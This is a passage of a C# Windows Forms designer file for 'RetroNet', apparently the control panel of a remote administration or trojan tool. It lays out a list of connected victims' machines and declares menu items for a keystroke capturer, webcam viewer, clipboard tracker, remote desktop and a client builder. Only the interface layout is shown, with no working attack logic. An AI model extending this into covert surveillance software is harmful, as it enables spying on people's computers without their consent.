            this.flagsImageList.Images.SetKeyName(99, "ht.png");
            this.flagsImageList.Images.SetKeyName(100, "hu.png");
            this.flagsImageList.Images.SetKeyName(101, "id.png");
            this.flagsImageList.Images.SetKeyName(102, "ie.png");
            this.flagsImageList.Images.SetKeyName(103, "il.png");
            this.flagsImageList.Images.SetKeyName(104, "in.png");
            this.flagsImageList.Images.SetKeyName(105, "io.png");
            this.flagsImageList.Images.SetKeyName(106, "iq.png");
            this.flagsImageList.Images.SetKeyName(107, "ir.png");
            this.flagsImageList.Images.SetKeyName(108, "is.png");
            this.flagsImageList.Images.SetKeyName(109, "it.png");
            this.flagsImageList.Images.SetKeyName(110, "jm.png");
            this.flagsImageList.Images.SetKeyName(111, "jo.png");
            this.flagsImageList.Images.SetKeyName(112, "jp.png");
            this.flagsImageList.Images.SetKeyName(113, "ke.png");
            this.flagsImageList.Images.SetKeyName(114, "kg.png");
            this.flagsImageList.Images.SetKeyName(115, "kh.png");
            this.flagsImageList.Images.SetKeyName(116, "ki.png");
            this.flagsImageList.Images.SetKeyName(117, "km.png");
            this.flagsImageList.Images.SetKeyName(118, "kn.png");
            this.flagsImageList.Images.SetKeyName(119, "kp.png");
            this.flagsImageList.Images.SetKeyName(120, "kr.png");
            this.flagsImageList.Images.SetKeyName(121, "kw.png");
            this.flagsImageList.Images.SetKeyName(122, "ky.png");
            this.flagsImageList.Images.SetKeyName(123, "kz.png");
            this.flagsImageList.Images.SetKeyName(124, "la.png");
            this.flagsImageList.Images.SetKeyName(125, "lb.png");
            this.flagsImageList.Images.SetKeyName(126, "lc.png");
            this.flagsImageList.Images.SetKeyName(127, "li.png");
            this.flagsImageList.Images.SetKeyName(128, "lk.png");
            this.flagsImageList.Images.SetKeyName(129, "lr.png");
            this.flagsImageList.Images.SetKeyName(130, "ls.png");
            this.flagsImageList.Images.SetKeyName(131, "lt.png");
            this.flagsImageList.Images.SetKeyName(132, "lu.png");
            this.flagsImageList.Images.SetKeyName(133, "lv.png");
            this.flagsImageList.Images.SetKeyName(134, "ly.png");
            this.flagsImageList.Images.SetKeyName(135, "ma.png");
            this.flagsImageList.Images.SetKeyName(136, "mc.png");
            this.flagsImageList.Images.SetKeyName(137, "md.png");
            this.flagsImageList.Images.SetKeyName(138, "me.png");
            this.flagsImageList.Images.SetKeyName(139, "mg.png");
            this.flagsImageList.Images.SetKeyName(140, "mh.png");
            this.flagsImageList.Images.SetKeyName(141, "mk.png");
            this.flagsImageList.Images.SetKeyName(142, "ml.png");
            this.flagsImageList.Images.SetKeyName(143, "mm.png");
            this.flagsImageList.Images.SetKeyName(144, "mn.png");
            this.flagsImageList.Images.SetKeyName(145, "mo.png");
            this.flagsImageList.Images.SetKeyName(146, "mp.png");
            this.flagsImageList.Images.SetKeyName(147, "mq.png");
            this.flagsImageList.Images.SetKeyName(148, "mr.png");
            this.flagsImageList.Images.SetKeyName(149, "ms.png");
            this.flagsImageList.Images.SetKeyName(150, "mt.png");
            this.flagsImageList.Images.SetKeyName(151, "mu.png");
            this.flagsImageList.Images.SetKeyName(152, "mv.png");
            this.flagsImageList.Images.SetKeyName(153, "mw.png");
            this.flagsImageList.Images.SetKeyName(154, "mx.png");
            this.flagsImageList.Images.SetKeyName(155, "my.png");
            this.flagsImageList.Images.SetKeyName(156, "mz.png");
            this.flagsImageList.Images.SetKeyName(157, "na.png");
            this.flagsImageList.Images.SetKeyName(158, "nc.png");
            this.flagsImageList.Images.SetKeyName(159, "ne.png");
            this.flagsImageList.Images.SetKeyName(160, "nf.png");
            this.flagsImageList.Images.SetKeyName(161, "ng.png");
            this.flagsImageList.Images.SetKeyName(162, "ni.png");
            this.flagsImageList.Images.SetKeyName(163, "nl.png");
            this.flagsImageList.Images.SetKeyName(164, "no.png");
            this.flagsImageList.Images.SetKeyName(165, "np.png");
            this.flagsImageList.Images.SetKeyName(166, "nr.png");
            this.flagsImageList.Images.SetKeyName(167, "nu.png");
            this.flagsImageList.Images.SetKeyName(168, "nz.png");
            this.flagsImageList.Images.SetKeyName(169, "om.png");
            this.flagsImageList.Images.SetKeyName(170, "pa.png");
            this.flagsImageList.Images.SetKeyName(171, "pe.png");
            this.flagsImageList.Images.SetKeyName(172, "pf.png");
            this.flagsImageList.Images.SetKeyName(173, "pg.png");
            this.flagsImageList.Images.SetKeyName(174, "ph.png");
            this.flagsImageList.Images.SetKeyName(175, "pk.png");
            this.flagsImageList.Images.SetKeyName(176, "pl.png");
            this.flagsImageList.Images.SetKeyName(177, "pm.png");
            this.flagsImageList.Images.SetKeyName(178, "pn.png");
            this.flagsImageList.Images.SetKeyName(179, "pr.png");
            this.flagsImageList.Images.SetKeyName(180, "ps.png");
            this.flagsImageList.Images.SetKeyName(181, "pt.png");
            this.flagsImageList.Images.SetKeyName(182, "pw.png");
            this.flagsImageList.Images.SetKeyName(183, "py.png");
            this.flagsImageList.Images.SetKeyName(184, "qa.png");
            this.flagsImageList.Images.SetKeyName(185, "re.png");
            this.flagsImageList.Images.SetKeyName(186, "ro.png");
            this.flagsImageList.Images.SetKeyName(187, "rs.png");
            this.flagsImageList.Images.SetKeyName(188, "ru.png");
            this.flagsImageList.Images.SetKeyName(189, "rw.png");
            this.flagsImageList.Images.SetKeyName(190, "sa.png");
            this.flagsImageList.Images.SetKeyName(191, "sb.png");
            this.flagsImageList.Images.SetKeyName(192, "sc.png");
            this.flagsImageList.Images.SetKeyName(193, "scotland.png");
            this.flagsImageList.Images.SetKeyName(194, "sd.png");
            this.flagsImageList.Images.SetKeyName(195, "se.png");
            this.flagsImageList.Images.SetKeyName(196, "sg.png");
            this.flagsImageList.Images.SetKeyName(197, "sh.png");
            this.flagsImageList.Images.SetKeyName(198, "si.png");
            this.flagsImageList.Images.SetKeyName(199, "sj.png");
            this.flagsImageList.Images.SetKeyName(200, "sk.png");
            this.flagsImageList.Images.SetKeyName(201, "sl.png");
            this.flagsImageList.Images.SetKeyName(202, "sm.png");
            this.flagsImageList.Images.SetKeyName(203, "sn.png");
            this.flagsImageList.Images.SetKeyName(204, "so.png");
            this.flagsImageList.Images.SetKeyName(205, "sr.png");
            this.flagsImageList.Images.SetKeyName(206, "st.png");
            this.flagsImageList.Images.SetKeyName(207, "sv.png");
            this.flagsImageList.Images.SetKeyName(208, "sy.png");
            this.flagsImageList.Images.SetKeyName(209, "sz.png");
            this.flagsImageList.Images.SetKeyName(210, "tc.png");
            this.flagsImageList.Images.SetKeyName(211, "td.png");
            this.flagsImageList.Images.SetKeyName(212, "tf.png");
            this.flagsImageList.Images.SetKeyName(213, "tg.png");
            this.flagsImageList.Images.SetKeyName(214, "th.png");
            this.flagsImageList.Images.SetKeyName(215, "tj.png");
            this.flagsImageList.Images.SetKeyName(216, "tk.png");
            this.flagsImageList.Images.SetKeyName(217, "tl.png");
            this.flagsImageList.Images.SetKeyName(218, "tm.png");
            this.flagsImageList.Images.SetKeyName(219, "tn.png");
            this.flagsImageList.Images.SetKeyName(220, "to.png");
            this.flagsImageList.Images.SetKeyName(221, "tr.png");
            this.flagsImageList.Images.SetKeyName(222, "tt.png");
            this.flagsImageList.Images.SetKeyName(223, "tv.png");
            this.flagsImageList.Images.SetKeyName(224, "tw.png");
            this.flagsImageList.Images.SetKeyName(225, "tz.png");
            this.flagsImageList.Images.SetKeyName(226, "ua.png");
            this.flagsImageList.Images.SetKeyName(227, "ug.png");
            this.flagsImageList.Images.SetKeyName(228, "um.png");
            this.flagsImageList.Images.SetKeyName(229, "us.png");
            this.flagsImageList.Images.SetKeyName(230, "uy.png");
            this.flagsImageList.Images.SetKeyName(231, "uz.png");
            this.flagsImageList.Images.SetKeyName(232, "va.png");
            this.flagsImageList.Images.SetKeyName(233, "vc.png");
            this.flagsImageList.Images.SetKeyName(234, "ve.png");
            this.flagsImageList.Images.SetKeyName(235, "vg.png");
            this.flagsImageList.Images.SetKeyName(236, "vi.png");
            this.flagsImageList.Images.SetKeyName(237, "vn.png");
            this.flagsImageList.Images.SetKeyName(238, "vu.png");
            this.flagsImageList.Images.SetKeyName(239, "wales.png");
            this.flagsImageList.Images.SetKeyName(240, "wf.png");
            this.flagsImageList.Images.SetKeyName(241, "ws.png");
            this.flagsImageList.Images.SetKeyName(242, "ye.png");
            this.flagsImageList.Images.SetKeyName(243, "yt.png");
            this.flagsImageList.Images.SetKeyName(244, "za.png");
            this.flagsImageList.Images.SetKeyName(245, "zm.png");
            this.flagsImageList.Images.SetKeyName(246, "zw.png");
            // 
            // mainNotifyIcon
            // 
            this.mainNotifyIcon.Visible = true;
            // 
            // logToolStripMenuItem
            // 
            this.logToolStripMenuItem.Image = global::RetroNet.Properties.Resources.page_white_text;
            this.logToolStripMenuItem.Name = "logToolStripMenuItem";
            this.logToolStripMenuItem.Size = new System.Drawing.Size(55, 20);
            this.logToolStripMenuItem.Text = "Log";
            this.logToolStripMenuItem.Click += new System.EventHandler(this.logToolStripMenuItem_Click);
            // 
            // connectionsListView
            // 
            this.connectionsListView.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.connectionsListView.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.connectionsListView.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.countryHeader,
            this.identityHeader,
            this.ipAddressHeader,
            this.portHeader,
            this.operatingSystemHeader,
            this.computerNameHeader,
            this.userNameHeader,
            this.cpuHeader,
            this.ramHeader,
            this.versionHeader});
            this.connectionsListView.ContextMenuStrip = this.functionsMenuStrip;
            this.connectionsListView.FullRowSelect = true;
            this.connectionsListView.Location = new System.Drawing.Point(0, 25);
            this.connectionsListView.Name = "connectionsListView";
            this.connectionsListView.Size = new System.Drawing.Size(909, 179);
            this.connectionsListView.SmallImageList = this.flagsImageList;
            this.connectionsListView.TabIndex = 1;
            this.connectionsListView.UseCompatibleStateImageBehavior = false;
            this.connectionsListView.View = System.Windows.Forms.View.Details;
            this.connectionsListView.SelectedIndexChanged += new System.EventHandler(this.connectionsListView_SelectedIndexChanged);
            // 
            // countryHeader
            // 
            this.countryHeader.Text = "Country";
            this.countryHeader.Width = 130;
            // 
            // identityHeader
            // 
            this.identityHeader.Text = "Identity";
            this.identityHeader.Width = 90;
            // 
            // ipAddressHeader
            // 
            this.ipAddressHeader.Text = "IP Address";
            this.ipAddressHeader.Width = 100;
            // 
            // portHeader
            // 
            this.portHeader.Text = "Port";
            this.portHeader.Width = 50;
            // 
            // operatingSystemHeader
            // 
            this.operatingSystemHeader.Text = "Operating System";
            this.operatingSystemHeader.Width = 120;
            // 
            // computerNameHeader
            // 
            this.computerNameHeader.Text = "Computer Name";
            this.computerNameHeader.Width = 110;
            // 
            // userNameHeader
            // 
            this.userNameHeader.Text = "User Name";
            this.userNameHeader.Width = 110;
            // 
            // cpuHeader
            // 
            this.cpuHeader.Text = "CPU";
            // 
            // ramHeader
            // 
            this.ramHeader.Text = "RAM";
            // 
            // versionHeader
            // 
            this.versionHeader.Text = "Version";
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(909, 226);
            this.Controls.Add(this.mainStatusStrip);
            this.Controls.Add(this.connectionsListView);
            this.Controls.Add(this.mainMenuStrip);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.MinimumSize = new System.Drawing.Size(925, 265);
            this.Name = "Main";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RetroNet";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Main_FormClosing);
            this.mainMenuStrip.ResumeLayout(false);
            this.mainMenuStrip.PerformLayout();
            this.mainStatusStrip.ResumeLayout(false);
            this.mainStatusStrip.PerformLayout();
            this.functionsMenuStrip.ResumeLayout(false);
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.MenuStrip mainMenuStrip;
        private System.Windows.Forms.ToolStripMenuItem connectToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem configurationToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem clientBuilderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uPnPToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileTransfersToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem aboutToolStripMenuItem;
        private Controls.AeroListView connectionsListView;
        private System.Windows.Forms.ColumnHeader countryHeader;
        private System.Windows.Forms.ColumnHeader identityHeader;
        private System.Windows.Forms.ColumnHeader computerNameHeader;
        private System.Windows.Forms.ColumnHeader userNameHeader;
        private System.Windows.Forms.ColumnHeader ipAddressHeader;
        private System.Windows.Forms.ColumnHeader portHeader;
        private System.Windows.Forms.ColumnHeader operatingSystemHeader;
        private System.Windows.Forms.StatusStrip mainStatusStrip;
        private System.Windows.Forms.ToolStripMenuItem pluginsToolStripMenuItem;
        private System.Windows.Forms.ContextMenuStrip functionsMenuStrip;
        private System.Windows.Forms.ColumnHeader cpuHeader;
        private System.Windows.Forms.ColumnHeader ramHeader;
        private System.Windows.Forms.ColumnHeader versionHeader;
        private System.Windows.Forms.ToolStripMenuItem newsToolStripMenuItem;
        private System.Windows.Forms.ImageList flagsImageList;
        private System.Windows.Forms.ToolStripStatusLabel connectedUsersNameLabel;
        private System.Windows.Forms.ToolStripStatusLabel connectedUsersValueLabel;
        private System.Windows.Forms.ToolStripStatusLabel selectedUsersNameLabel;
        private System.Windows.Forms.ToolStripStatusLabel selectedUsersValueLabel;
        private System.Windows.Forms.ToolStripStatusLabel dataReceivedNameLabel;
        private System.Windows.Forms.ToolStripStatusLabel dataReceivedValueLabel;
        private System.Windows.Forms.ToolStripStatusLabel dataSentNameLabel;
        private System.Windows.Forms.ToolStripStatusLabel dataSentValueLabel;
        private System.Windows.Forms.ToolStripMenuItem remoteDesktopToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem webcamViewerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fileExplorerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem processManagerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem keystrokeCapturerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem instantMessengerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem registryEditorToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem clipboardTrackerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem applicationHandlerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem startupMonitorToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem serviceAdministerToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator remoteStripSeparator;
        private System.Windows.Forms.ToolStripSeparator computerStripSeparator;
        private System.Windows.Forms.ToolStripMenuItem clientToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uninstallClientToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restartClientToolStripMenuItem;
        private System.Windows.Forms.ToolStripSeparator clientStripSeparator;
        private System.Windows.Forms.ToolStripMenuItem updateClientToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem shutDownComputerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem restartComputerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem logOffComputerToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fromFileToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem fromUrlToolStripMenuItem;
        private System.Windows.Forms.NotifyIcon mainNotifyIcon;
        private System.Windows.Forms.ToolStripMenuItem logToolStripMenuItem;

    }
}